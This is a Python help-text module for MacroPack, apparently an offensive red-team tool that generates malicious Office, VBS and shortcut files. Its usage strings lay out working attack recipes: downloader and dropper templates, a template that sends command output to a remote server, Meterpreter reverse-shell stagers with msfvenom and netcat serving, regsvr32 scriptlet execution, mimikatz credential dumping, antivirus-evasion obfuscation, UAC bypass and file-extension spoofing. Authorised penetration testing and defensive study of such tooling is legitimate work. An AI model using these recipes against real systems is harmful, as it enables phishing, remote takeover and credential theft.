#!/usr/bin/python3
# encoding: utf-8

from termcolor import colored

from common import utils
from common.utils import MSTypes
from common.definitions import VERSION
MP_TYPE="Pro"
if utils.checkModuleExist("pro_core"):
    from pro_core.help_pro import getProBanner, getAvBypassFunctionPro, getGenerationFunctionPro, getOtherFunctionPro, getTemplateUsagePro, printAvailableFormatsPro
else:
    MP_TYPE="Community"


TOOLPRES = """\

  _  _   __    ___  ____   __     ____   __    ___  __ _
 ( \/ ) / _\  / __)(  _ \ /  \   (  _ \ / _\  / __)(  / )
 / \/ \/    \( (__  )   /(  O )   ) __//    \( (__  )  (
 \_)(_/\_/\_/ \___)(__\_) \__/   (__)  \_/\_/ \___)(__\_)


   Malicious Office, VBS, Shortcuts and other formats for pentests and redteam """

def getToolPres():
    if MP_TYPE == "Pro":
        return getProBanner()
    else:
        BANNER = """\
        %s- Version:%s Release:%s
        
        """ % (TOOLPRES,VERSION, MP_TYPE)
    return BANNER


"""Webmeter support removed from now
        WEBMETER
        Meterpreter reverse https template using VbsMeter by Cn33liz.
        This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
        Give this template the IP and PORT of listening mfsconsole
         -> Example: echo <ip> 443 | %s -t WEBMETER -o -G meter.sct

        This template also generates a  webmeter.rc file to create the Metasploit handler
         -> Example: msfconsole -r webmeter.rc

                --------------------
From README:
 - Generate obfuscated Meterpreter reverse https TCP SCT file and run it  
 ```batch
# 1 Generate obfuscated VBS scriptlet and Metasploit resource file based on meterpreter reverse HTTPS template
echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.sct
# 2 On attacker machine Setup meterpreter listener
msfconsole -r webmeter.rc
# 3 run scriptlet with regsvr32 
regsvr32 /u /n /s /i:meter.sct scrobj.dll

 ```
                

"""


def getTemplateUsage(currentApp):
    templatesInfo = \
r"""
    Templates can be called using  -t, --template=TEMPLATE_NAME combined with other options.
    Available templates:

                --------------------

        HELLO
        Just print a hello message
        Give this template the name of the user
          -> Example: echo "World" | %s -t HELLO -G hello.pptm

                --------------------

        CMD
        Execute a command
        Give this template a command line
          -> Example:  echo "calc.exe" | %s -t CMD -o -G cmd.xsl

                --------------------

        REMOTE_CMD
        Execute a command line and send result to remote http server
        Give this template the server url and the command to run
          -> Example:  echo "http://192.168.0.5:7777" "dir /Q C:" | %s -t REMOTE_CMD -o -G cmd.doc

                --------------------

        DROPPER
        Download and execute a file
        Give this template the file url and the target file path
          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER -o -G dropper.xls

                --------------------

        DROPPER_PS
        Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe)
        Note: This payload will download PowerShdll from Github.
        Give this template the url of the powershell script you want to run
         -> Example:  echo "<powershell_script_url>" | %s -t DROPPER_PS -o -G powpow.doc

                --------------------

        DROPPER_DLL
        Download a DLL, drop it on file system without .dll extension, and run it using rundll32
          -> Example, load meterpreter DLL using Excel:

        REM Generate meterpreter dll payload
        msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
        REM Make it available on webserver, ex using netcat on port 6666
        { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
        REM Create Office file which will download DLL and call it
        REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
        echo "http://192.168.0.5:6666/normal.html" Run | %s -t DROPPER_DLL -o -G meterdll.xls

                --------------------

        METERPRETER
        Meterpreter reverse TCP template using MacroMeter by Cn33liz.
        This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
        Give this template the IP and PORT of listening mfsconsole
         -> Example: echo <ip> <port> | %s -t METERPRETER -o -G meter.docm

        This template also generates a  meterpreter.rc file to create the Metasploit handler
          -> Example: msfconsole -r meterpreter.rc

                --------------------

        EMBED_EXE
        Drop and execute embedded file.
        Combine with --embed option, it will drop and execute the embedded file with random name under TEMP folder.
         -> Example:  %s -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs

                --------------------

        EMBED_DLL
        Combine with --embed option, it will drop and call a function in the given DLL
        Give this template the name and parameters of function to call in DLL
        -> Example1 : echo "main" | %s -t EMBED_DLL --embed=cmd.dll -o -G cmd.doc
        -> Example2 : echo "main log privilege::debug sekurlsa::logonpasswords exit" | %s -t EMBED_DLL --embed=mimikatz.dll -o -G mimidropper.hta

                --------------------
""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp,currentApp,currentApp,currentApp)
    return templatesInfo
    

def getGenerationFunction():
    details = """ Main payload generation options:
    -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the payload format based on extension.
        MacroPack supports most Ms Office and VB based payloads as well various kinds of shortcut files. 
        Note: Office payload generation requires that MS Office application is installed on the machine 
    --listformats View all file formats which can be generated by MacroPack  
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option or non VB formats
        If no input file is provided, input must be passed via stdin (using a pipe).   
    -t, --template=TEMPLATE_NAME    Use code template already included in MacroPack
        MacroPack supports multiple predefined templates useful for social engineering, redteaming, and security bypass    
    --listtemplates View all templates provided by MacroPack
    -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
        Use with EMBED_EXE template to auto drop and exec the file or with EMBED_DLL to drop/load the embedded dll.   """ 
    return details


def getAvBypassFunction():
    details = """ Security bypass options: 
    -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)
    --obfuscate-names-charset=<CHARSET> Set a charset for obfuscated variables and functions
        Choose between: alpha, alphanum, complete or provide the list of char you want
    --obfuscate-names-minlen=<len> Set min length of obfuscated variables and functions (default 8)
    --obfuscate-names-maxlen=<len> Set max length of obfuscated variables and functions (default 20)
    --uac-bypass Execute payload with high privileges if user is admin. Compatible with most MacroPack templates """ 
    return details



def getOtherFunction(currentApp):
    details = """ Other options: 
    -q, --quiet Do not display anything on screen, just process request.
    -p, --print Display result file on stdout (will display VBA for Office formats)
        Combine this option with -q option to pipe result into another program
        ex: cat input_file.vba | %s -o -G obfuscated.vba -q -p | another_app    
    -s, --start-function=START_FUNCTION   Entry point of macro file
        Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
    --icon Path of generated file icon. Default is %%windir%%\system32\imageres.dll,67
    --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
        This option is only compatible with Excel formats.    
    --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
        This will trigger AutoOpen/Workbook_Open automatically.
        If no auto start function, use --start-function option to indicate which macro to run.   
    --unicode-rtlo=SPOOF_EXTENSION Inject the unicode U+202E char (Right-To-Left Override) to spoof the file extension when view in explorers.
            Ex. To generate an hta file with spoofed jpg extension use options: -G something.hta --unicode-rtlo=jpg
            In this case, windows or linux explorers will show the file named as: somethingath.jpg
    -l, --listen=ROOT_PATH\tOpen an HTTP server from ROOT_PATH listening on default port 80.
    -w, --webdav-listen=ROOT_PATH Open a WebDAV server on default port 80, giving access to ROOT_PATH.
    --port=PORT Specify the listening port for HTTP and WebDAV servers.""" % currentApp
    return details


def getCommunityUsage(currentApp):
    details = """
%s

%s

%s

""" % (getGenerationFunction(), getAvBypassFunction(), getOtherFunction(currentApp))
    return details
    




def printAvailableFormats(banner):
    print(colored(banner, 'green'))
    print("    Supported Office formats:")
    for fileType in MSTypes.MS_OFFICE_FORMATS:
        print("       - %s: %s" % (fileType, MSTypes.EXTENSION_DICT[fileType]))
    print("    Note: Ms Office file generation requires Windows OS with MS Office application installed.")
    print("\n    Supported VB formats:")
    for fileType in MSTypes.VBSCRIPTS_FORMATS:
        print("       - %s: %s" % (fileType, MSTypes.EXTENSION_DICT[fileType]))
    print("\n    Supported shortcuts/miscellaneous formats:")
    for fileType in MSTypes.Shortcut_FORMATS:
        print("       - %s: %s" % (fileType, MSTypes.EXTENSION_DICT[fileType]))
    print("\n    WARNING: These formats are only supported in MacroPack Pro:")
    for fileType in MSTypes.ProMode_FORMATS:
        print("       - %s: %s" % (fileType, MSTypes.EXTENSION_DICT[fileType]))
        
    print("\n     To create a payload for a certain format just add extension to payload.\n     Ex.  -G payload.hta ")
    if MP_TYPE=="Pro":
        printAvailableFormatsPro()
    

def printCommunityUsage(banner, currentApp):
    print(colored(banner, 'green'))
    print(" Usage 1: echo  <parameters> | %s -t <TEMPLATE> -G <OUTPUT_FILE> [options] " %currentApp)
    print(" Usage 2: %s  -f input_file_path -G <OUTPUT_FILE> [options] " % currentApp)
    print(" Usage 3: more input_file_path | %s -G <OUTPUT_FILE> [options] " %currentApp)
    
    details = getCommunityUsage(currentApp)
   
    details +="    -h, --help   Displays help and exit"
    details += \
r"""

 Notes:
    Have a look at README.md file for more details and usage!
    Home: www.github.com/sevagas && blog.sevagas.com

"""
    print(details)
    
    

def printProUsage(banner, currentApp):
    print(colored(banner, 'green'))
    print(" Usage 1: echo  <parameters> | %s -t <TEMPLATE> -G <OUTPUT_FILE> [options] " %currentApp)
    print(" Usage 2: %s  -f input_file_path -G <OUTPUT_FILE> [options] " % currentApp)
    print(" Usage 3: more input_file_path | %s -G <OUTPUT_FILE> [options] " %currentApp)
    details = """
%s
%s

%s
%s

%s
%s

""" % (getGenerationFunction(), getGenerationFunctionPro(), getAvBypassFunction(), getAvBypassFunctionPro(), getOtherFunction(currentApp), getOtherFunctionPro())
    details +="    -h, --help   Displays help and exit \n"

    print(details)
    
def printTemplatesUsage(banner, currentApp):
    print(colored(banner, 'green'))
    templatesInfo = getTemplateUsage(currentApp)
    if MP_TYPE=="Pro":
        templatesInfo = getTemplateUsagePro()
    print(templatesInfo)

    
    
def printUsage(banner, currentApp):
    if MP_TYPE=="Pro":
        printProUsage(banner, currentApp)
    else:
        printCommunityUsage(banner, currentApp)

